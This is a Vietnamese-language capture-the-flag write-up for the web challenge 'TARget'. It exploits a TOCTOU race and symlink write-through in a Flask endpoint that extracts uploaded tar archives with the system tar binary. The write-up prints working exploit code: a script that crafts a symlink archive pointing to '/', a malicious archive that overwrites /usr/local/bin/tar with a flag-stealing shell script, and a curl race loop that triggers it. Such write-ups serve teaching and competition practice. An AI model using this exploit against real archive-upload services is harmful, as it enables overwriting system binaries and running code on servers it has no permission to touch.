## web/TARget
### Challenge Description

I gib you 1 endpoint, you gib me flag.

Challenge cung cấp duy nhất một endpoint upload TAR:

`POST /untar`

Mục tiêu là đọc flag nằm trong container.

### Initial Analysis

Source code chính:
```
@app.route('/untar', methods=['POST'])
def untar_file():
    ...

    UPLOAD_FOLDER = os.path.join(
        os.getcwd(),
        'uploads',
        str(int(time.time()))
    )

    tar_path = os.path.join(
        UPLOAD_FOLDER,
        file.filename
    )

    file.save(tar_path)

    subprocess.check_output([
        'tar',
        '-xf',
        tar_path,
        '-C',
        UPLOAD_FOLDER
    ])
```
Có 2 điểm rất đáng chú ý:

**1. App sử dụng GNU tar của hệ thống**
```
subprocess.check_output([
    'tar',
    '-xf',
    tar_path,
    '-C',
    UPLOAD_FOLDER
])
```
Tức là application không dùng Python `tarfile` an toàn, mà gọi trực tiếp binary:

`tar`qua `PATH`.

**2. Upload folder dựa trên `time.time()`**
`str(int(time.time()))`

Điều này nghĩa là:

mọi request trong cùng 1 giây
sẽ dùng chung thư mục upload

Ví dụ:

`/app/uploads/1747965340/`

=> Đây là race condition cực mạnh.

### The Real Vulnerability

Challenge bị dính:

`TOCTOU race + symlink write-through`

Ý tưởng:

**Request A**

Extract một symlink:

`root -> /`
Request B

Extract file:

`root/usr/local/bin/tar`

Vì root là symlink tới `/`, file thực tế sẽ được ghi vào:

`/usr/local/bin/tar`
### Why This Works

Trên Linux, `PATH` thường có:

`/usr/local/bin`

đứng trước:

`/usr/bin`

Khi app gọi:

`subprocess.check_output(['tar', ...])`

system sẽ ưu tiên:

`/usr/local/bin/tar`

nếu tồn tại.

Do đó ta có thể overwrite binary tar bằng shell script của chính mình.

### Building The Exploit
#### Step 1 — Create Symlink TAR

Tạo archive chứa:

`root -> /`

Payload:
```
python3 - <<'PY'
def tar_header(name, typeflag=b'2', linkname=''):
    h = bytearray(512)

    def put(off, size, data):
        data = data.encode() if isinstance(data, str) else data
        h[off:off+min(len(data), size)] = data[:size]

    put(0, 100, name)
    put(100, 8, '0000777\0')
    put(108, 8, '0000000\0')
    put(116, 8, '0000000\0')
    put(124, 12, '00000000000\0')
    put(136, 12, '00000000000\0')

    h[148:156] = b'        '
    h[156:157] = typeflag

    put(157, 100, linkname)

    put(257, 6, 'ustar\0')
    put(263, 2, '00')

    checksum = sum(h)
    put(148, 8, f'{checksum:06o}\0 ')

    return bytes(h)

open(
    'symlink.tar',
    'wb'
).write(
    tar_header(
        'root',
        b'2',
        '/'
    )
)
PY
```
#### Step 2 — Create Fake tar Binary

Ta tạo fake tar script:
```
#!/bin/sh
mkdir -p /app/static
cat /flag-*.txt > /app/static/flag.txt
exit 0
```
Khi application gọi tar lần tiếp theo:

fake tar sẽ chạy thay GNU tar thật

và dump flag vào static folder.

Payload:
```
python3 - <<'PY'
import tarfile
import io
import os

script = b'''#!/bin/sh
mkdir -p /app/static
cat /flag-*.txt > /app/static/flag.txt
exit 0
'''

ti = tarfile.TarInfo(
    'root/usr/local/bin/tar'
)

ti.size = len(script)
ti.mode = 0o777
ti.mtime = 0

with tarfile.open(
    'fake.tar',
    'w:gz'
) as t:
    t.addfile(
        ti,
        io.BytesIO(script)
    )

print(
    "size:",
    os.path.getsize('fake.tar')
)
PY
```
#### Step 3 — Win The Race

Ta spam đồng thời:

**Request 1**

Extract symlink.

**Request 2**

Extract fake tar.

Nếu cả hai dùng chung timestamp folder:

`root/`

trong archive thứ hai sẽ follow symlink của archive thứ nhất.

**Exploit:**
```
for i in {1..500}; do
  curl -s -X POST \
    http://127.0.0.1:5000/untar \
    -F "file=@symlink.tar;filename=s.tar" &

  curl -s -X POST \
    http://127.0.0.1:5000/untar \
    -F "file=@fake.tar;filename=f.tar" &

  wait
done
```
### Verifying The Overwrite

Kiểm tra trong container:
```
docker exec -it target-dist-target-1 \
  sh -c "
    ls -l /usr/local/bin/tar &&
    cat /usr/local/bin/tar
  "
```
Nếu thành công:
```
#!/bin/sh
mkdir -p /app/static
cat /flag-*.txt > /app/static/flag.txt
exit 0
```
#### Step 4 — Trigger Fake tar

Gửi thêm một request bất kỳ:
```
curl -s -X POST \
  http://127.0.0.1:5000/untar \
  -F "file=@symlink.tar;filename=s.tar"
```
Lúc này application sẽ gọi:

`/usr/local/bin/tar`

thay vì GNU tar thật.

Fake tar sẽ đọc flag.

#### Step 5 — Read The Flag
`curl http://127.0.0.1:5000/static/flag.txt`
Sau khi xác nhận chạy tốt trên local, chạy trên remote để lấy flag.
![Running the Exploit](https://lh3.googleusercontent.com/u/0/d/1LmIRH6PvzW2zC2Ft1Cc8N9hHF0XveVyw)
Flag: `HCMUS-CTF{D1d_y0u_kn0w_th4t_unZ1p_4ls0_h4v3_th1s_1ssu3_but_w0rs3?}`